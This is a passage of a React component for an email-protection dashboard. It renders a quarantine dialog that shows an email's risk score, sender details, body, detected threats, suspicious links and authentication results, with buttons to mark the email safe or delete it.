                  <Typography variant="subtitle2" color="text.secondary">Risk Score</Typography>
                  <Typography variant="h5" color={getRiskColor(selectedQuarantine.scanResult.riskScore) + '.main'}>
                    {selectedQuarantine.scanResult.riskScore}/100
                  </Typography>
                </Box>
                <LinearProgress
                  variant="determinate"
                  value={selectedQuarantine.scanResult.riskScore}
                  color={getRiskColor(selectedQuarantine.scanResult.riskScore)}
                  sx={{ height: 10, borderRadius: 5 }}
                />
                <Typography variant="body2" color="text.secondary" mt={1}>
                  {selectedQuarantine.scanResult.recommendation.message}
                </Typography>
              </Box>

              <Divider sx={{ my: 2 }} />

              {/* Email Details */}
              <Typography variant="subtitle1" gutterBottom fontWeight="bold">Email Information</Typography>
              <Grid container spacing={2} mb={2}>
                <Grid item xs={12}>
                  <Typography variant="body2" color="text.secondary">From:</Typography>
                  <Typography variant="body1">
                    {selectedQuarantine.email.displayName && (
                      <>{selectedQuarantine.email.displayName} &lt;</>
                    )}
                    {selectedQuarantine.email.from}
                    {selectedQuarantine.email.displayName && <>&gt;</>}
                  </Typography>
                </Grid>
                {selectedQuarantine.email.replyTo && (
                  <Grid item xs={12}>
                    <Typography variant="body2" color="text.secondary">Reply-To:</Typography>
                    <Typography variant="body1">{selectedQuarantine.email.replyTo}</Typography>
                  </Grid>
                )}
                <Grid item xs={12}>
                  <Typography variant="body2" color="text.secondary">Subject:</Typography>
                  <Typography variant="body1" fontWeight="medium">{selectedQuarantine.email.subject}</Typography>
                </Grid>
                <Grid item xs={12}>
                  <Typography variant="body2" color="text.secondary" gutterBottom>Body:</Typography>
                  <Paper 
                    variant="outlined" 
                    sx={{ 
                      p: 2, 
                      maxHeight: 200, 
                      overflow: 'auto',
                      bgcolor: 'grey.50',
                      fontFamily: 'monospace',
                      fontSize: '0.875rem'
                    }}
                  >
                    <Typography sx={{ whiteSpace: 'pre-wrap' }}>
                      {selectedQuarantine.email.body}
                    </Typography>
                  </Paper>
                </Grid>
              </Grid>

              <Divider sx={{ my: 2 }} />

              {/* Threats Detected */}
              <Typography variant="subtitle1" gutterBottom fontWeight="bold">
                Detected Threats ({selectedQuarantine.scanResult.threats.length})
              </Typography>
              <Box mb={2}>
                {selectedQuarantine.scanResult.threats.map((threat, i) => (
                  <Accordion key={i}>
                    <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                      <Box display="flex" alignItems="center" gap={2} width="100%">
                        <WarningIcon color={getSeverityColor(threat.severity)} />
                        <Typography sx={{ flexGrow: 1 }}>{threat.description}</Typography>
                        <Chip
                          label={threat.severity.toUpperCase()}
                          size="small"
                          color={getSeverityColor(threat.severity)}
                        />
                        <Chip
                          label={threat.type.split('-').join(' ')}
                          size="small"
                          variant="outlined"
                        />
                      </Box>
                    </AccordionSummary>
                    <AccordionDetails>
                      {threat.indicators && (
                        <Box mb={1}>
                          <Typography variant="body2" color="text.secondary" gutterBottom>
                            Indicators:
                          </Typography>
                          <List dense>
                            {threat.indicators.map((indicator, j) => (
                              <ListItem key={j}>
                                <ListItemText primary={`• ${indicator}`} />
                              </ListItem>
                            ))}
                          </List>
                        </Box>
                      )}
                      {threat.matchedKeywords && threat.matchedKeywords.length > 0 && (
                        <Box mb={1}>
                          <Typography variant="body2" color="text.secondary" gutterBottom>
                            Matched Keywords:
                          </Typography>
                          <Box display="flex" flexWrap="wrap" gap={1}>
                            {threat.matchedKeywords.map((keyword, j) => (
                              <Chip key={j} label={keyword} size="small" color="warning" />
                            ))}
                          </Box>
                        </Box>
                      )}
                      {threat.links && threat.links.length > 0 && (
                        <Box>
                          <Typography variant="body2" color="text.secondary" gutterBottom>
                            Suspicious Links:
                          </Typography>
                          <List dense>
                            {threat.links.map((link, j) => (
                              <ListItem key={j}>
                                <ListItemIcon>
                                  <LinkIcon color="error" />
                                </ListItemIcon>
                                <ListItemText
                                  primary={link.url}
                                  secondary={`${link.reason} (${link.severity})`}
                                />
                              </ListItem>
                            ))}
                          </List>
                        </Box>
                      )}
                      {threat.patterns && threat.patterns.length > 0 && (
                        <Box>
                          <Typography variant="body2" color="text.secondary" gutterBottom>
                            Suspicious Patterns:
                          </Typography>
                          <Box display="flex" flexWrap="wrap" gap={1}>
                            {threat.patterns.map((pattern, j) => (
                              <Chip key={j} label={pattern} size="small" color="error" variant="outlined" />
                            ))}
                          </Box>
                        </Box>
                      )}
                    </AccordionDetails>
                  </Accordion>
                ))}
              </Box>

              {/* Email Authentication (if available) */}
              {selectedQuarantine.scanResult.analysisDetails?.headerAuthentication && (
                <>
                  <Divider sx={{ my: 2 }} />
                  <Typography variant="subtitle1" gutterBottom fontWeight="bold">
                    Email Authentication
                  </Typography>
                  <Grid container spacing={1}>
                    {selectedQuarantine.scanResult.analysisDetails.headerAuthentication.details.map((detail, i) => {
                      const isPassed = detail.includes('PASS');
                      return (
                        <Grid item xs={12} sm={4} key={i}>
                          <Chip
                            label={detail}
                            color={isPassed ? 'success' : 'error'}
                            size="small"
                            icon={isPassed ? <CheckCircleIcon /> : <WarningIcon />}
                            sx={{ width: '100%' }}
                          />
                        </Grid>
                      );
                    })}
                  </Grid>
                </>
              )}
            </DialogContent>
            <DialogActions>
              <Button onClick={() => setDialogOpen(false)}>Close</Button>
              <Button
                variant="outlined"
                color="success"
                startIcon={<ThumbUpIcon />}
                onClick={() => handleMarkSafe(selectedQuarantine)}
              >
                Mark as Safe & Trust Sender
              </Button>
              <Button
                color="error"
                variant="contained"
                startIcon={<DeleteIcon />}
                onClick={() => {
                  emailProtection.removeFromQuarantine(selectedQuarantine.id);
                  loadQuarantine();
                  setDialogOpen(false);
                  toast.success('Email removed from quarantine');
                }}
              >
                Delete
              </Button>
            </DialogActions>
          </>
        )}
      </Dialog>
    </Box>
  );
}

export default EmailProtection;
